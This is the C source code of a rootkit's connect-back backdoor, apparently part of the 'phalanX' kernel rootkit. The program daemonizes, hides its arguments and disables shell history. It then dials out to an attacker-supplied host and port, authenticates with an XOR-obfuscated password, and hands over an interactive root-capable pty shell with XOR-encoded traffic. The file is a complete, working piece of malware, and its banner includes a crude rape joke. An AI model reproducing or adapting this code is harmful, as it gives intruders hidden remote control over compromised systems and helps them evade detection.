/*
* this is the application which the kernel uses to spawn
* xor-obfuscated connectback-shells with tty capabilities
* in the future there will nicer encryption
* 
* must be compiled with -lutil
* 
* %rebel% oct 2005
* rebel@pulltheplug.org
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <sys/timeb.h>
#include <fcntl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include "conf.h"


int hupty;

//patented by me
//extremely advanced
//do not view this code unless you are wearing
//protective gear and goggles otherwise you might
//die of the incredible awesomeness of this function
unsigned char xorkeys[5] = { 'p', 'u', 'n', 'g', 0 };

void
ultraxor (char *buf, int count)
{
  char *p;
  int x, y;

  for (y = 0; y < 4; y++)
    for (p = buf, x = 0; x < count; x++, p++)
      *p = *p ^ xorkeys[y];

}


int
main (int argc, char *argv[])
{
  char buf[16000], buf2[512];
  int sd, rc, x, port = 31337, tty, pty, ptypid, fd, count;
  struct sockaddr_in localAddr, servAddr;
  struct hostent *h;
  char host[40], ptyname[512], *p;
  char *arg[3] = { "sh", "-i", 0 };
  char home[52];
  char *env[7] =
    { "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:",
    "HISTFILE=/dev/null",
    "TERM=xterm",
    home,
    "SHELL=/bin/bash",
    "PS1=\\[\\[\\033[1;37m\\]\\[\\033[1;35m\\]\\H\\[\\033[1;35m\\]\\[\\033[0m\\]:\\w; ",
    0
  };
  FILE *proc;

  sprintf (home, "HOME=/usr/share/.home%s", SUFFIX);


  setresgid (HAXORGID, HAXORGID, HAXORGID);


  if (fork () != 0)
    {
      exit (0);
    }
  setpgid (0, 0);


  p = strtok (argv[0], "!");
  p = strtok (NULL, "!");
  strcpy (host, p);
  p = strtok (NULL, "!");
  strcpy (buf, p);

  p = host;
  while (*p != '!')
    p++;
  *p = '\0';

  p = buf;
  while (*p != '+')
    p++;
  *p = '\0';


  port = atoi (buf);

  memset (argv[0], 0, 32);


//openpty(&tty,&pty,ptyname,NULL,NULL);

  openpty (&tty, &pty, ptyname, NULL, NULL);

  h = gethostbyname (host);
  if (h == NULL)
    {
      exit (1);
    }

  servAddr.sin_family = h->h_addrtype;
  memcpy ((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
  servAddr.sin_port = htons (port);
  sd = socket (AF_INET, SOCK_STREAM, 0);

  if (sd < 0)
    {
      exit (1);
    }

  localAddr.sin_family = AF_INET;
  localAddr.sin_addr.s_addr = htonl (INADDR_ANY);
  localAddr.sin_port = htons (0);

  rc = bind (sd, (struct sockaddr *) &localAddr, sizeof (localAddr));
  if (rc < 0)
    {
      exit (1);
    }

  rc = connect (sd, (struct sockaddr *) &servAddr, sizeof (servAddr));
  if (rc < 0)
    {
      exit (1);
    }

  if (fork () == 0)
    {
      int i;

      login_tty (pty);
      for (i = 1; i < 64; i++)
	signal (i, SIG_DFL);



      chdir (HOMEDIR);
      execve ("/bin/sh", arg, env);
    }

  close (pty);
  hupty = tty;

  read (sd, buf2, 13);
  ultraxor (buf2, 13);
  if (memcmp (buf2, PASSWORD, 13) != 0)
    exit (0);

  proc = popen ("/bin/uname -a", "r");
  fgets (buf2, 200, proc);
  pclose (proc);
  x = strlen (buf2);
//ultraxor(buf2,x);


  strcpy (buf,
	  "[\33[1;37m\33[1;44m phalanX beta 6 connected \33[1;37m\33[1;35m\33[1;37m\33[0m]\nRAPE TIME!\n");
/* OH THE GNOEZZZ!!!!!!!!!!!!! A STRCPY!!!!!!!!!!!!!!!!! */
  strcat (buf, buf2);

  x = strlen (buf);
  ultraxor (buf, x);
  write (sd, buf, x);

  while (1)
    {
      int err;
      fd_set fds;

      FD_ZERO (&fds);
      FD_SET (hupty, &fds);
      FD_SET (sd, &fds);

      err = select ((hupty > sd) ? (hupty + 1) : (sd + 1),
		    &fds, NULL, NULL, NULL);

      if (err < 0)
	{
	  if (err == -4)
	    continue;
	  break;
	}

      if (FD_ISSET (hupty, &fds))
	{
	  int count = read (hupty, buf, 16000);
	  if ((count <= 0) && (count != -4))
	    break;
	  ultraxor (buf, count);
	  write (sd, buf, count);
	}

      if (FD_ISSET (sd, &fds))
	{
	  int count;

	  count = read (sd, buf, 16000);
	  if ((count <= 0) && (count != -4))
	    break;

//uncomment if you want the key to change during the connection
/*xorkeys[0] = (xorkeys[0] + count) % 255;
xorkeys[1] = (xorkeys[1] + (count * 8)) % 255;
xorkeys[2] = (xorkeys[2] + (count * 2)) % 255;
xorkeys[3] = (xorkeys[3] + (count * 14)) % 255;*/

	  ultraxor (buf, count);
	  write (hupty, buf, count);
	}
    }



  exit (0);
}
